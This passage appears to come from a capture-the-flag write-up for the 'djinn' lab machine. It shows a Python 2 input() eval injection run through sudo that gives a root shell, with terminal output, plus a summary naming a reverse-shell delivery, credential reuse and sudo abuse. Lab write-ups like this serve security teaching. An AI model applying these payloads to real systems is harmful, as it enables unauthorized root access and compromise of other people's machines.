The traceback produced by pressing `Ctrl+C` is enormously revealing. The script is a Python file (`/root/lago`) and it uses `raw_input()`, which is a **Python 2 only** built-in function. In Python 2, `raw_input()` reads a line of text from standard input and returns it as a string. However, there is a critical distinction from Python 3's `input()`: Python 2 also has an `input()` function which **evaluates the input as a Python expression**, similar to `eval()`. The fact that this script uses `raw_input()` rather than `eval(input())` is noted — but the vulnerability exists at the "Guess the number" option.

### Decompiling .pyc for Source Intelligence

```bash
sam@djinn:/home/sam$ ls -la /home/sam
total 36
drwxr-x--- 4 sam  sam  4096 Nov 14  2019 .
drwxr-xr-x 4 root root 4096 Nov 14  2019 ..
-rw------- 1 root root  417 Nov 14  2019 .bash_history
-rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout
-rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc
drwx------ 2 sam  sam  4096 Nov 11  2019 .cache
drwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg
-rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile
-rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc
-rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful
```

```bash
sam@djinn:/home/sam$ file .pyc
.pyc: python 2.7 byte-compiled
sam@djinn:/home/sam$ strings .pyc
getuser(
system(
randintc
Working on it!! (
/home/mzfr/scripts/exp.pyt
naughtyboi
Choose a number between 1 to 100: s
Enter your number: s
/bin/shs
Better Luck next time(
inputR
numt
/home/mzfr/scripts/exp.pyt
guessit
Enter the full of the file to read: s!
User %s is not allowed to read %s(
usert
path(
/home/mzfr/scripts/exp.pyt
readfiles
What do you want to do ?s
1 - Be naughtys
2 - Guess the numbers
3 - Read some damn filess
4 - Works
Enter your choice: (
intR
choice(
/home/mzfr/scripts/exp.pyt
options
work your ass off!!s"
Do something better with your life(
/home/mzfr/scripts/exp.pyt
main'
__main__N(
getpassR
randomR
__name__(
/home/mzfr/scripts/exp.pyt
<module>
```

The `.pyc` file is a Python 2.7 bytecode compiled version of the `/root/lago` script, originating from `/home/mzfr/scripts/exp.pyt`. The `strings` output reveals function names: `naughtyboi`, `guessit`, `readfiles`, `options`, and `main`. The critical strings are `Enter your number: s` and `inputR` inside the `guessit` function. The presence of `inputR` (where `R` denotes a reference to a built-in name) confirms that the `guessit` function uses Python 2's `input()` function rather than `raw_input()`. Python 2's `input()` calls `eval()` internally on whatever the user types, making it **trivially exploitable for arbitrary code execution**.

### Exploiting Python 2 input() to Spawn Root Shell

```bash
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100:
Enter your number: __import__('os').system('/bin/bash')
root@djinn:/home/sam# id
uid=0(root) gid=0(root) groups=0(root)
root@djinn:/home/sam# cd
root@djinn:~# id
uid=0(root) gid=0(root) groups=0(root)
root@djinn:~# whoami;hostname
root
djinn
```

Choosing option `2` (Guess the number) drops into the `guessit` function. At the `Enter your number:` prompt, instead of a number, the Python 2 expression `__import__('os').system('/bin/bash')` was injected. Python 2's `input()` evaluates this as live Python code: `__import__('os')` dynamically imports the `os` module and `.system('/bin/bash')` spawns an interactive Bash process. Since `sudo /root/lago` runs as `root`, the resulting shell inherits `uid=0`.

### Capturing Flags

```bash
root@djinn:~# cat /home/nitish/user.txt /root/root.txt
HMV{WW9[REDACTED]}
HMV{eWV[REDACTED]}
```

Both flags are captured. The user flag resides at `/home/nitish/user.txt` and the root flag at `/root/root.txt`.

---

## Attack Chain Summary

1. **Reconnaissance**: Full port scan with `nmap -sC -sV -p- -T4` against `192.168.100.148` discovered four TCP services: anonymous FTP on port 21, filtered SSH on port 22, a custom math game daemon on port 1337, and a Werkzeug Python web application on port 7331.

2. **Vulnerability Discovery**: Anonymous FTP login yielded three plaintext files. `creds.txt` contained `nitu:81299`. `game.txt` confirmed the purpose of port 1337. `message.txt` revealed the internal username `nitish`. Web directory fuzzing with Feroxbuster exposed a hidden `/wish` endpoint that accepted shell commands via a POST parameter named `cmd`, confirming unauthenticated Remote Code Execution. The port 1337 math game was identified as a port-knocking sequence delivery mechanism requiring 1000 correct arithmetic answers to receive the three knock ports `1356 6784 3409`.

3. **Exploitation**: A Python socket automation script solved all 1000 math challenges on port 1337, obtaining the port-knocking sequence. Sequential Nmap probes to ports `1356`, `6784`, and `3409` triggered the firewall rule that unfiltered SSH port 22. A base64-encoded bash reverse shell payload was delivered to `/wish` via `curl --data-urlencode`, establishing an interactive PTY shell as `www-data`.

4. **Internal Enumeration**: As `www-data`, the file system was explored and the world-readable directory `/home/nitish/.dev/` was discovered containing `creds.txt` with `nitish`'s plaintext password. `su nitish` succeeded with this password, elevating to a fully authenticated user account. `sudo -l` as `nitish` revealed a NOPASSWD rule to run `/usr/bin/genie` as `sam`. Running `sudo -u sam /usr/bin/genie -cmd id` produced a shell as `sam`. `sudo -l` as `sam` revealed a NOPASSWD rule to run `/root/lago` as `root`. The `.pyc` bytecode file in `sam`'s home directory was analyzed with `strings` and confirmed that the `guessit` function in `/root/lago` uses Python 2's dangerous `input()` built-in.

5. **Privilege Escalation**: Running `sudo /root/lago` as `sam`, selecting option `2` (Guess the number), and injecting `__import__('os').system('/bin/bash')` at the number prompt exploited Python 2's `input()` function which evaluates user input as a live Python expression. This spawned a Bash shell as `root` (`uid=0`), granting complete system control and enabling retrieval of both flags from `/home/nitish/user.txt` and `/root/root.txt`.
